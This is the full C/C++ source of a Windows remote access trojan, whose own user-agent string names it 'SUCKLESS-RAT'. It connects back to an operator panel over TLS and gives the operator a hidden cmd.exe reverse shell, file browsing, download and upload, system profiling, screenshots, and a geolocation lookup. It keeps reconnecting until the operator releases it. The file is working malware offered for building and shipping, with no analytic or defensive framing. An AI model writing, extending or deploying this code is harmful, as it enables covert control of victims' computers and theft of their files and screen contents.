#include "../common/proto.h"
#include "../common/tls.h"
#include "../common/util.h"
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

// ── config ──────────────────────────────────────────────────────────────────
// Panel address for the agent. Edit this line, rebuild, ship agent.exe.
// A host:port passed on the command line still overrides it.
static const char kServer[] = "127.0.0.1:8443";
// ────────────────────────────────────────────────────────────────────────────

static TlsCtx* g_tls = NULL;
static volatile LONG g_run = 1;
static volatile LONG g_bye = 0;   // set only when the operator sends C_BYE
static HANDLE g_hShellInW = NULL, g_hShellOutR = NULL, g_hShellProc = NULL;
static CRITICAL_SECTION g_cs;

static DWORD WINAPI ShellReader(LPVOID) {
  char buf[4096]; DWORD n;
  HANDLE out = g_hShellOutR;
  while (ReadFile(out, buf, sizeof(buf), &n, NULL)) {
    if (n == 0) break;
    EnterCriticalSection(&g_cs);
    if (g_tls && g_run) TlsSendMsg(g_tls, C_SHELL_DATA, buf, n);
    LeaveCriticalSection(&g_cs);
  }
  EnterCriticalSection(&g_cs);
  if (g_tls && g_run) TlsSendMsg(g_tls, C_SHELL_CLOSE, NULL, 0);
  LeaveCriticalSection(&g_cs);
  return 0;
}

static void ShellStart() {
  SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
  HANDLE inR, inW, outR, outW;
  if (!CreatePipe(&inR, &inW, &sa, 0) || !CreatePipe(&outR, &outW, &sa, 0)) return;
  SetHandleInformation(inW, HANDLE_FLAG_INHERIT, 0);
  SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);
  STARTUPINFOA si = { 0 }; si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  si.hStdInput = inR; si.hStdOutput = outW; si.hStdError = outW;
  PROCESS_INFORMATION pi = { 0 };
  if (!CreateProcessA(NULL, (LPSTR)"cmd.exe /Q /K chcp 65001 > nul", NULL, NULL, TRUE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    CloseHandle(inR); CloseHandle(inW); CloseHandle(outR); CloseHandle(outW);
    return;
  }
  g_hShellInW = inW; g_hShellOutR = outR; g_hShellProc = pi.hProcess;
  CloseHandle(inR); CloseHandle(outW); CloseHandle(pi.hThread);
  CreateThread(NULL, 0, ShellReader, NULL, 0, NULL);
}

static void ShellStop() {
  if (g_hShellProc) { TerminateProcess(g_hShellProc, 0); CloseHandle(g_hShellProc); g_hShellProc = NULL; }
  if (g_hShellInW) { CloseHandle(g_hShellInW); g_hShellInW = NULL; }
  if (g_hShellOutR) { CloseHandle(g_hShellOutR); g_hShellOutR = NULL; }
}

static char* FsList(const char* path, uint32_t* outLen) {
  char glob[MAX_PATH * 2];
  if (!path || path[0] == 0) strcpy(glob, "C:\\*");
  else {
    strcpy(glob, path);
    size_t len = strlen(glob);
    if (glob[len-1] != '\\' && glob[len-1] != '/') strcat(glob, "\\*");
    else strcat(glob, "*");
  }

  WIN32_FIND_DATAA fd;
  HANDLE h = FindFirstFileA(glob, &fd);
  if (h == INVALID_HANDLE_VALUE) {
    char* err = (char*)malloc(32);
    if (!err) { *outLen = 0; return NULL; }
    sprintf(err, "ERR|%lu\n", GetLastError());
    *outLen = strlen(err); return err;
  }

  char* out = NULL; size_t outSize = 0, outCap = 0;
  do {
    uint64_t sz = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
    char line[512];
    sprintf(line, "%s|%llu|%s\n", fd.cFileName, sz, (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "d" : "f");
    size_t lineLen = strlen(line);
    if (outSize + lineLen + 1 > outCap) {
      outCap = (outCap + lineLen + 1) * 2;
      char* newOut = (char*)realloc(out, outCap);
      if (!newOut) { free(out); FindClose(h); *outLen = 0; return NULL; }
      out = newOut;
    }
    memcpy(out + outSize, line, lineLen); outSize += lineLen;
  } while (FindNextFileA(h, &fd));
  FindClose(h);

  if (!out) out = (char*)malloc(1);
  if (out) out[outSize] = 0;
  *outLen = (uint32_t)outSize;
  return out;
}

static char* SysInfo(uint32_t* outLen) {
  char host[256] = {0}, user[256] = {0}, dir[MAX_PATH] = {0};
  DWORD n = sizeof(host); GetComputerNameA(host, &n);
  n = sizeof(user); GetUserNameA(user, &n);
  GetCurrentDirectoryA(sizeof(dir), dir);
  MEMORYSTATUSEX ms = { sizeof(ms) }; GlobalMemoryStatusEx(&ms);
  char windir[MAX_PATH] = {0}; GetWindowsDirectoryA(windir, sizeof(windir));
  ULARGE_INTEGER fr = {0}, tot = {0}, freeBytes = {0};
  GetDiskFreeSpaceExA("C:\\", &fr, &tot, &freeBytes);

  char* s = (char*)malloc(1024);
  if (!s) { *outLen = 0; return NULL; }
  sprintf(s, "host: %s\nuser: %s\nwindir: %s\ncwd: %s\nram: %llu MB total, %llu MB free\ndisk C: %llu GB total, %llu GB free\npid: %lu\n",
    host, user, windir, dir, ms.ullTotalPhys / (1024*1024), ms.ullAvailPhys / (1024*1024),
    tot.QuadPart / (1024*1024*1024), fr.QuadPart / (1024*1024*1024), GetCurrentProcessId());
  *outLen = strlen(s);
  return s;
}

static char* Screenshot(uint32_t* outLen) {
  int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN), vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
  int vx = GetSystemMetrics(SM_XVIRTUALSCREEN), vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
  HDC scr = GetDC(NULL), mem = CreateCompatibleDC(scr);
  HBITMAP bm = CreateCompatibleBitmap(scr, vw, vh);
  SelectObject(mem, bm);
  BitBlt(mem, 0, 0, vw, vh, scr, vx, vy, SRCCOPY | CAPTUREBLT);

  BITMAPINFO bi = {0}; bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
  bi.bmiHeader.biWidth = vw; bi.bmiHeader.biHeight = vh;
  bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24; bi.bmiHeader.biCompression = BI_RGB;
  int rowBytes = ((vw * 3 + 3) & ~3);
  DWORD px = (DWORD)rowBytes * vh;

  BITMAPFILEHEADER fh = {0};
  fh.bfType = 'B' | ('M' << 8);
  fh.bfOffBits = sizeof(fh) + sizeof(BITMAPINFOHEADER);
  fh.bfSize = fh.bfOffBits + px;

  char* out = (char*)malloc(fh.bfSize);
  if (out) {
    memcpy(out, &fh, sizeof(fh));
    memcpy(out + sizeof(fh), &bi.bmiHeader, sizeof(BITMAPINFOHEADER));
    GetDIBits(mem, bm, 0, vh, out + fh.bfOffBits, &bi, DIB_RGB_COLORS);
    *outLen = fh.bfSize;
  } else *outLen = 0;

  DeleteObject(bm); DeleteDC(mem); ReleaseDC(NULL, scr);
  return out;
}

static char g_country[64] = "?";

// SChannel's GetVersionEx lies for non-manifested apps (always reports 6.2),
// so ask ntdll directly and map the build number to a marketing name.
static const char* WinName() {
  static char name[32];
  if (name[0]) return name;
  HMODULE nt = GetModuleHandleA("ntdll.dll");
  typedef LONG (WINAPI* Fn)(OSVERSIONINFOW*);
  Fn fn = nt ? (Fn)GetProcAddress(nt, "RtlGetVersion") : NULL;
  OSVERSIONINFOW vi = { sizeof(vi) };
  DWORD b = (fn && fn(&vi) == 0) ? vi.dwBuildNumber : 0;
  const char* v = b >= 22000 ? "11" : b >= 10240 ? "10" : b >= 9600 ? "8.1"
                : b >= 9200 ? "8" : b >= 7600 ? "7" : b >= 6000 ? "Vista"
                : b >= 2600 ? "XP" : "";
  sprintf(name, "Windows%s%s", v[0] ? " " : "", v);
  return name;
}

static void FetchCountry() {
  HINTERNET h = InternetOpenA("SUCKLESS-RAT", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  if (!h) return;
  DWORD t = 3000;
  InternetSetOptionA(h, INTERNET_OPTION_CONNECT_TIMEOUT, &t, sizeof(t));
  InternetSetOptionA(h, INTERNET_OPTION_SEND_TIMEOUT, &t, sizeof(t));
  InternetSetOptionA(h, INTERNET_OPTION_RECEIVE_TIMEOUT, &t, sizeof(t));
  HINTERNET u = InternetOpenUrlA(h, "http://ip-api.com/line/?fields=country", NULL, 0,
      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_CACHE_WRITE, 0);
  if (u) {
    char b[128] = {0}; DWORD r = 0;
    if (InternetReadFile(u, b, sizeof(b) - 1, &r) && r) {
      while (r && (b[r - 1] == '\n' || b[r - 1] == '\r' || b[r - 1] == ' ')) b[--r] = 0;
      if (r && strcmp(b, "fail") != 0) { strncpy(g_country, b, sizeof(g_country) - 1); }
    }
    InternetCloseHandle(u);
  }
  InternetCloseHandle(h);
}

static DWORD WINAPI Worker(const char* addr) {
  char host[256] = {0}; int port = 8443;
  strncpy(host, addr, 255);
  char* colon = strchr(host, ':');
  if (colon) { *colon = 0; port = atoi(colon + 1); }

  struct addrinfo* ai = NULL;
  char portStr[16]; sprintf(portStr, "%d", port);
  if (getaddrinfo(host, portStr, NULL, &ai) != 0) return 0;

  SOCKET s = INVALID_SOCKET;
  for (auto p = ai; p; p = p->ai_next) {
    s = socket(p->ai_family, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) continue;
    if (connect(s, p->ai_addr, (int)p->ai_addrlen) == 0) break;
    closesocket(s); s = INVALID_SOCKET;
  }
  freeaddrinfo(ai);
  if (s == INVALID_SOCKET) return 0;

  TlsCtx* t = (TlsCtx*)malloc(sizeof(TlsCtx));
  if (!t) return 0;
  InitTlsCtx(t, s);
  if (!TlsAcquire(t, NULL) || !TlsHandshake(t)) { free(t); closesocket(s); return 0; }
  EnterCriticalSection(&g_cs); g_tls = t; LeaveCriticalSection(&g_cs);

  char hbuf[256] = {0}, ubuf[256] = {0}; DWORD n = sizeof(hbuf);
  GetComputerNameA(hbuf, &n); n = sizeof(ubuf); GetUserNameA(ubuf, &n);
  char hello[1024]; sprintf(hello, "%s|%s|%s|%s", hbuf, ubuf, WinName(), g_country);
  TlsSendMsg(t, C_HELLO, hello, strlen(hello));

  uint16_t cmd = 0; char* pl = NULL; uint32_t plLen = 0;
  for (;;) {
    if (!TlsRecvMsg(t, &cmd, &pl, &plLen)) break;
    switch (cmd) {
      case C_SHELL_START: ShellStart(); break;
      case C_SHELL_CLOSE: ShellStop(); break;
      case C_SHELL_DATA:
        if (g_hShellInW && pl) { DWORD w; WriteFile(g_hShellInW, pl, plLen, &w, NULL); }
        break;
      case C_FS_LIST: {
        uint32_t outLen; char* r = FsList(pl, &outLen);
        if (r) { TlsSendMsg(t, C_FS_LIST_RESP, r, outLen); free(r); }
        break;
      }
      case C_FS_GET: {
        uint32_t outLen; char* d = ReadFileAll(pl, &outLen);
        if (d) { TlsSendMsg(t, C_FS_FILE, d, outLen); free(d); }
        else TlsSendMsg(t, C_FS_FILE, NULL, 0);
        break;
      }
      case C_FS_PUT: {
        if (!pl) break;
        char* nl = strchr(pl, '\n');
        if (nl) { *nl = 0; WriteFileAll(pl, nl + 1, plLen - (uint32_t)(nl - pl) - 1); }
        break;
      }
      case C_SYSINFO: {
        uint32_t outLen; char* r = SysInfo(&outLen);
        if (r) { TlsSendMsg(t, C_SYSINFO, r, outLen); free(r); }
        break;
      }
      case C_SCREEN: {
        uint32_t outLen; char* bmp = Screenshot(&outLen);
        if (bmp) { TlsSendMsg(t, C_SCREEN_IMG, bmp, outLen); free(bmp); }
        break;
      }
      case C_BYE: g_bye = 1; goto done;
    }

    // ВОТ ГЛАВНЫЙ ФИКС: Освобождаем pl ТОЛЬКО после того, как все данные из него скопированы и отправлены!
    if (pl) { free(pl); pl = NULL; }
  }
done:
  ShellStop();
  EnterCriticalSection(&g_cs); g_tls = NULL; LeaveCriticalSection(&g_cs);
  TlsSendMsg(t, C_BYE, NULL, 0);
  closesocket(s); FreeTlsCtx(t); free(t);
  return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
  InitializeCriticalSection(&g_cs);
  WSADATA w; WSAStartup(MAKEWORD(2, 2), &w);
  const char* addr = (lpCmdLine && *lpCmdLine) ? lpCmdLine : kServer;
  while (*addr == ' ') addr++;
  FetchCountry();
  // Panel may be closed, crashed or restarted; a remote agent must survive that
  // and keep trying. Only an explicit "Disconnect client" (C_BYE) ends it.
  while (!g_bye) {
    Worker(addr);
    if (!g_bye) Sleep(3000);
  }
  return 0;
}